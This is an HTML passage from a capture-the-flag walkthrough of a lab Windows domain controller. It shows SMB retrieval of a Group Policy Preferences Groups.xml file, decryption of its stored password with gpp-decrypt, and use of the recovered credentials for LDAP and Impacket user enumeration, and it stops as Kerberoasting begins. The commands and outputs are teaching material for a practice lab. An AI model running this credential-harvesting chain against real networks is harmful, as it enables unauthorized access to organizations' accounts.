                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;DfsrPrivate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DHS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;Policies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;scripts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;Jul&nbsp;18&nbsp;19<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>57&nbsp;2018<br>
                <br>
                [...]<br>
                <br>
                <span style="color:#333333;font-weight:400">\a</span>ctive.htb<span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#ff9d00;font-weight:700">}</span><br>
                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;GPT.INI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23&nbsp;&nbsp;Wed&nbsp;Jul&nbsp;18&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>46<span style="color:#ff9d00;font-weight:700">:</span>06&nbsp;2018<br>
                &nbsp;&nbsp;Group&nbsp;Policy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;MACHINE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;Jul&nbsp;18&nbsp;19<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;2018<br>
                <br>
                [...]<br>
                <br>
                <span style="color:#333333;font-weight:400">\a</span>ctive.htb<span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#ff9d00;font-weight:700">}</span><span style="color:#333333;font-weight:400">\M</span>ACHINE<span style="color:#333333;font-weight:400">\P</span>references<span style="color:#333333;font-weight:400">\G</span>roups<br>
                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;Groups.xml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;533&nbsp;&nbsp;Wed&nbsp;Jul&nbsp;18&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>46<span style="color:#ff9d00;font-weight:700">:</span>06&nbsp;2018<br>
                <br>
                [...]
            </div>
        </div><br>
        <br>
        Towards the bottom of the listing you should see 1 file that stands out - <code>Groups.xml</code>.<br>
        <br>
        Retreieve the file with <code>get</code>.<br>
            <div class="codebox">
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;active.htb<span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#ff9d00;font-weight:700">}</span><span style="color:#333333;font-weight:400">\M</span>ACHINE<span style="color:#333333;font-weight:400">\P</span>references<span style="color:#333333;font-weight:400">\G</span>roups<span style="color:#333333;font-weight:400">\G</span>roups.xml&nbsp;<br>
                getting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#333333;font-weight:400">\a</span>ctive.htb<span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#ff9d00;font-weight:700">}</span><span style="color:#333333;font-weight:400">\M</span>ACHINE<span style="color:#333333;font-weight:400">\P</span>references<span style="color:#333333;font-weight:400">\G</span>roups<span style="color:#333333;font-weight:400">\G</span>roups.xml&nbsp;of&nbsp;size&nbsp;533&nbsp;as&nbsp;active.htb<span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#ff9d00;font-weight:700">}</span><span style="color:#333333;font-weight:400">\M</span>ACHINE<span style="color:#333333;font-weight:400">\P</span>references<span style="color:#333333;font-weight:400">\G</span>roups<span style="color:#333333;font-weight:400">\G</span>roups.xml&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>4.2&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;4.2&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span><br>
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
                <br>
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;Groups.xml&nbsp;</span><br>
                &lt;?xml&nbsp;version=<span style="color:#3ad900;font-weight:400">"1.0"</span>&nbsp;encoding=<span style="color:#3ad900;font-weight:400">"utf-8"</span>?&gt;<br>
                &lt;Groups&nbsp;clsid=<span style="color:#3ad900;font-weight:400">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span>&gt;&lt;User&nbsp;clsid=<span style="color:#3ad900;font-weight:400">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span>&nbsp;name=<span style="color:#3ad900;font-weight:400">"active.htb\SVC_TGS"</span>&nbsp;image=<span style="color:#3ad900;font-weight:400">"2"</span>&nbsp;changed=<span style="color:#3ad900;font-weight:400">"2018-07-18&nbsp;20:46:06"</span>&nbsp;uid=<span style="color:#3ad900;font-weight:400">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span>&gt;&lt;Properties&nbsp;action=<span style="color:#3ad900;font-weight:400">"U"</span>&nbsp;newName=<span style="color:#3ad900;font-weight:400">""</span>&nbsp;fullName=<span style="color:#3ad900;font-weight:400">""</span>&nbsp;description=<span style="color:#3ad900;font-weight:400">""</span>&nbsp;cpassword=<span style="color:#3ad900;font-weight:400">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span>&nbsp;changeLogon=<span style="color:#3ad900;font-weight:400">"0"</span>&nbsp;noChange=<span style="color:#3ad900;font-weight:400">"1"</span>&nbsp;neverExpires=<span style="color:#3ad900;font-weight:400">"1"</span>&nbsp;acctDisabled=<span style="color:#3ad900;font-weight:400">"0"</span>&nbsp;userName=<span style="color:#3ad900;font-weight:400">"active.htb\SVC_TGS"</span><span style="color:#ff9d00;font-weight:700">/</span>&gt;&lt;<span style="color:#ff9d00;font-weight:700">/</span>User&gt;<br>
                &lt;<span style="color:#ff9d00;font-weight:700">/</span>Groups&gt;
            </div>
        </div><br>
        <br>
        <a id="h3-4" name="h3-4"></a><strong></strong>
        <h3><strong>2b) Group Policy Preferences</strong></h3><br>
        Group Policy Preferences (GPP) was introduced in Windows Server 2008 and, among other features, allows admins to modify users and groups accross the network.<br>
        <br>
        User passwords are stored in the <code>Groups.xml</code> file, and are AES-256 encrypted.<br>
        <br>
        However, at some point in 2012, Microsoft published the Groups.xml AES key on MSDN (their developer network/Microsoft manual), which means that GPP passwords are now trivial to crack.<br>
        <br>
        <img alt="images\2-2.png" src="images/2-2.png"><br>
        <br>
        In the <code>Groups.xml</code> file you just retrieved, can see a username and their encrypted password.<br>
        <br>
        <code>name="active.htb\SVC_TGS"</code><br>
        <code>cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</code><br>
        <br>
        The encrypted password can be cracked with <code>gpp-decrypt</code>.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gpp-decrypt&nbsp;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br>
                GPPstillStandingStrong2k18
            </div>
        </div><br>
        <br>
        We now have a set of credentials:<br>
        <code>SVC_TGS</code><br>
        <code>GPPstillStandingStrong2k18</code><br>
        <br>
        You can grab <code>user.txt</code> from the <code>Users</code> smb share at this point.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#smbclient&nbsp;//10.10.10.100/Users&nbsp;-U&nbsp;SVC_TGS</span><br>
                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\S</span>VC_TGSs&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
                Try&nbsp;<span style="color:#3ad900;font-weight:400">"help"</span>&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;SVC_TGS<span style="color:#333333;font-weight:400">\D</span>esktop<br>
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\S</span>VC_TGS<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;user.txt<br>
                getting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#333333;font-weight:400">\S</span>VC_TGS<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\u</span>ser.txt&nbsp;of&nbsp;size&nbsp;34&nbsp;as&nbsp;user.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.3&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;0.3&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span><br>
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\S</span>VC_TGS<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;user.txt</span><br>
                86d67d8b...
            </div>
        </div><br>
        <br>
        <a id="h2-3" name="h2-3"></a><strong></strong>
        <h2><strong>3) 389/ldap</strong></h2><br>
        Armed with credentials, we can extract information (more than if anonymously authenticating) from Active Directory.<br>
        <br>
        To query Active Directory effectively, we first need the naming contexts.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ldapsearch&nbsp;-H&nbsp;ldap://10.10.10.100&nbsp;-x&nbsp;-s&nbsp;base&nbsp;-b&nbsp;""&nbsp;namingContexts</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;extended&nbsp;LDIF</span><br>
                <span style="color:#0088ff;font-weight:400">#</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;LDAPv3</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;base&nbsp;&lt;&gt;&nbsp;with&nbsp;scope&nbsp;baseObject</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;filter:&nbsp;(objectclass=*)</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;requesting:&nbsp;namingContexts&nbsp;</span><br>
                <span style="color:#0088ff;font-weight:400">#</span><br>
                <br>
                <span style="color:#0088ff;font-weight:400">#</span><br>
                dn<span style="color:#ff9d00;font-weight:700">:</span><br>
                namingContexts<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;DC=active,DC=htb<br>
                namingContexts<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;CN=Configuration,DC=active,DC=htb<br>
                namingContexts<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;CN=Schema,CN=Configuration,DC=active,DC=htb<br>
                namingContexts<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;DC=DomainDnsZones,DC=active,DC=htb<br>
                namingContexts<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;DC=ForestDnsZones,DC=active,DC=htb<br>
                <br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;search&nbsp;result</span><br>
                search<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2<br>
                result<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0&nbsp;Success<br>
                <br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;numResponses:&nbsp;2</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;numEntries:&nbsp;1</span>
            </div>
        </div><br>
        <br>
        The naming contexts are: <code>DC=active,DC=htb</code><strong><br></strong>We get an error if we try to anonymously authenticate with Active Directory.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ldapsearch&nbsp;-H&nbsp;ldap://10.10.10.100&nbsp;-x&nbsp;-LLL&nbsp;-b&nbsp;"DC=active,DC=htb"</span><br>
                Operations&nbsp;error&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>1<span style="color:#ff9d00;font-weight:700">)</span><br>
                Additional&nbsp;information<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;000004DC<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;LdapErr<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;DSID-0C09075A,&nbsp;comment<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;In&nbsp;order&nbsp;to&nbsp;perform&nbsp;this&nbsp;operation&nbsp;a&nbsp;successful&nbsp;<span style="color:#ff9d00;font-weight:700">bind</span>&nbsp;must&nbsp;be&nbsp;completed&nbsp;on&nbsp;the&nbsp;connection.,&nbsp;data&nbsp;0,&nbsp;v1db1
            </div>
        </div><br>
        <br>
        Instead, use the credentials you extracted the SMB share to authenticate.<br>
        The output is <em>very</em> long, so I would advise directing the output to a text file.<br>
            <div class="codebox">
                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ldapsearch&nbsp;-H&nbsp;ldap://10.10.10.100&nbsp;-x&nbsp;-LLL&nbsp;-b&nbsp;"DC=active,DC=htb"&nbsp;-D&nbsp;'SVC_TGS'&nbsp;-w&nbsp;'GPPstillStandingStrong2k18'</span><br>
                dn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;DC=active,DC=htb<br>
                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;top<br>
                objectClass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;domain<br>
                [...]
            </div>
        </div><br>
        <br>
        From Active Directory, we can retrieve a list of users that authenticate with the Domain Controller.<br>
        You could trawl through the output yourself, <code>grep</code> for <code>sAMAccountName</code> in the output, or use <code>Impacket</code>'s <code>GetADUsers.py</code>.<br>
        <br>
        I used Impacket's <code>GetADUsers.py</code>:<br>
        <code>-all</code> - enumerate all users (even if the account is disabled)<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#GetADUsers.py&nbsp;-all&nbsp;-dc-ip&nbsp;10.10.10.100&nbsp;active.htb/SVC_TGS:GPPstillStandingStrong2k18</span><br>
                Impacket&nbsp;v0.9.21-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
                <br>
                [*]&nbsp;Querying&nbsp;10.10.10.100&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">information</span>&nbsp;about&nbsp;domain.<br>
                Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Email&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PasswordLastSet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastLogon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                --------------------&nbsp;&nbsp;------------------------------&nbsp;&nbsp;-------------------&nbsp;&nbsp;-------------------<br>
                Administrator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2018-07-18&nbsp;20:06:40.351723&nbsp;&nbsp;2018-07-30&nbsp;18:17:40.656520&nbsp;<br>
                Guest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;never&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;never&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                krbtgt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2018-07-18&nbsp;19:50:36.972031&nbsp;&nbsp;&lt;never&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                SVC_TGS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2018-07-18&nbsp;21:14:38.402764&nbsp;&nbsp;
            </div>
        </div><br>
        <br>
        <a id="h2-4" name="h2-4"></a><strong></strong>
        <h2><strong>4) Kerberoasting</strong></h2><br>
        Now with a list of users in Active Directory, we can check if any these users have been configured with an SPN<br>
        An SPN is what Kerberos, Windows' authentication protocol, uses to identify which accounts are running network services (MSSQL, etc.) on the network.<br>
        <br>
        List accounts configured wtih an SPN (Service Principal Name) using Impacket's <code>GetUserSPNs.py</code><br>
            <div class="codebox">
                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
